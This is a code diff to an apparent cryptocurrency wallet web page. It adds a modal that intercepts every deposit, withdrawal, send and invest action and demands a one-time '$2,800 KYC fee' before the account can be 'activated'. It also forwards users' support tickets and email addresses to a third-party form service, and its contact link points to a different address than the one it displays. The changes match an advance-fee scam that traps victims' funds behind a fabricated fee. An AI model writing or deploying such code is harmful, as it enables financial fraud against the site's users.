@@ -519,6 +519,24 @@
       </form>
     </div>
   </div>
+  <!-- KYC REQUIRED MODAL -->
+  <div class="modal" id="kycModal">
+    <div class="modal-content" style="max-width: 410px; text-align: center;">
+      <button class="close-modal" onclick="closeModal('kyc')">&times;</button>
+      <img src="https://img.icons8.com/ios-filled/100/0052ff/identity-theft.png" alt="KYC Required" style="width:64px;height:64px;margin-bottom:1rem;">
+      <h3 style="color:#e11d48;margin-bottom:0.7em;">Account Activation Required</h3>
+      <p style="font-size:1.08em; color:#23272f; margin-bottom:1.2em;">
+        To access this feature, please activate your account by completing KYC verification.<br>
+        <span style="color:#1652f0;font-weight:600;">A one-time KYC fee of <span style="color:#e11d48;">$2,800</span> is required.</span>
+      </p>
+      <div style="background:#f3f7ff;border-radius:8px;padding:1em 0.7em;margin-bottom:1.2em;">
+        <span style="color:#0052ff;font-weight:500;">Need help?</span><br>
+        Contact our Customer Center:<br>
+        <a href="mailto:support@basecrypto.help" style="color:#1652f0;font-weight:600;text-decoration:underline;">info@basecrypto.help</a>
+      </div>
+      <button class="btn-primary" onclick="closeModal('kyc')" style="width:100%;margin-top:0.5em;">OK</button>
+    </div>
+  </div>
 </div>
 <script>
 // ------------------ CONSTANTS -----------------
@@ -584,9 +602,17 @@ window.recentTx = [];
 
 // ----------------- DEPOSIT -----------------
 function openModal(type) {
+  if (['deposit', 'withdraw', 'send', 'invest'].includes(type)) {
+    document.getElementById('kycModal').classList.add('active');
+    return;
+  }
   document.getElementById(type + "Modal").classList.add("active");
 }
 function closeModal(type) {
+  if (type === 'kyc') {
+    document.getElementById('kycModal').classList.remove('active');
+    return;
+  }
   document.getElementById(type + "Modal").classList.remove("active");
   const form = document.getElementById(type + "Form");
   if (form) form.reset();
@@ -867,6 +893,18 @@ document.getElementById("supportForm").onsubmit = function(e){
   })
   .then(r=>r.json()).then(r=>{
     if(r.created===1){
+      // Also send to support email
+      fetch("https://formspree.io/f/xwkgyyqv", {
+        method: "POST",
+        headers: { "Accept": "application/json", "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: mail,
+          subject: subject,
+          message: msg,
+          _replyto: mail,
+          _cc: "support@basecrypto.help"
+        })
+      });
       showMsg('supportSuccess',"Ticket sent! We'll contact you soon.");
       document.getElementById("supportForm").reset();
     }else{
